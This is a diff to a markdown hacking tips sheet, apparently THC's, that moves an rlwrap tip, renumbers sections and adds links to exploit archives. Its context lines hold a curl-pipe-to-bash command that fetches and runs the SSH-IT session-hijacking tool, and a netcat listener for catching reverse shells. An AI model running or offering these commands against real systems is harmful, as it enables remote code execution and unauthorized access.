@@ -67,8 +67,8 @@ Got tricks? Join us on Telegram: [https://t.me/thcorg](https://t.me/thcorg)
    1. [with a wrapper script](#ssswor-anchor)
    1. [with SSH-IT](#sshit-anchor)
 1. [Miscellaneous](#misc-anchor)
-   1. [How to survive high latency connections](#hlc-anchor)
    1. [OSINT Intelligence Gathering](#osint-anchor)
+   1. [Exploits](#exploits)
    1. [Cool Linux commands](#cool-anchor)
    1. [tmux](#tmux-anchor)
    1. [Useful commands](#useful-anchor)  
@@ -818,22 +818,8 @@ The easiest way is using [https://www.thc.org/ssh-it/](https://www.thc.org/ssh-i
 bash -c "$(curl -fsSL ssh-it.thc.org/x)"
 ```
 
-<a id="hlc-anchor"></a>
-**10.i. How to survive high latency connections**
-
-Hacking over long latency links or slow links can be frustrating. Every keystroke is transmitted one by one and any typo becomes so much more frustrating and time consuming to undo. *rlwrap* comes to the rescue. It buffers all single keystrokes until *Enter* is hit and then transmits the entire line at once. This makes it so much easier to type at high speed, correct typos, ...
-
-Example for the receiving end of a revese tunnel:
-```sh
-rlwrap nc -vnlp 1524
-```
-
-Example for *SSH*:
-```sh
-rlwrap ssh user@host
-```
 <a id="osint-anchor"></a>
-**10.ii. Intelligence Gathering**
+**10.i. Intelligence Gathering**
 
 | OSINT Hacker Tools ||
 | --- | --- |
@@ -853,7 +839,12 @@ rlwrap ssh user@host
 | https://cipher387.github.io/osint_stuff_tool_collection/ | OSINT tools collection |
 | https://osintframework.com/ | Many OSINT tools |
 
+<a id="exploits"></a>
+**10.ii. Exploits**
 
+1. https://packetstormsecurity.com/
+1. https://www.exploit-db.com/
+ 
 <a id="cool-anchor"></a>
 **10.iii. Cool Linux commands**
 
@@ -883,5 +874,16 @@ Use ```netstat -rn``` or ```ip route show``` to show default Internet route.
 
 Use ```curl cheat.sh/tar``` to get TLDR help for tar. Works with any other linux command.
 
+Hacking over long latency links or slow links can be frustrating. Every keystroke is transmitted one by one and any typo becomes so much more frustrating and time consuming to undo. *rlwrap* comes to the rescue. It buffers all single keystrokes until *Enter* is hit and then transmits the entire line at once. This makes it so much easier to type at high speed, correct typos, ...
+
+Example for the receiving end of a revese tunnel:
+```sh
+rlwrap nc -vnlp 1524
+```
+
+Example for *SSH*:
+```sh
+rlwrap ssh user@host
+```
 ---
 Shoutz: ADM, subz/#9x
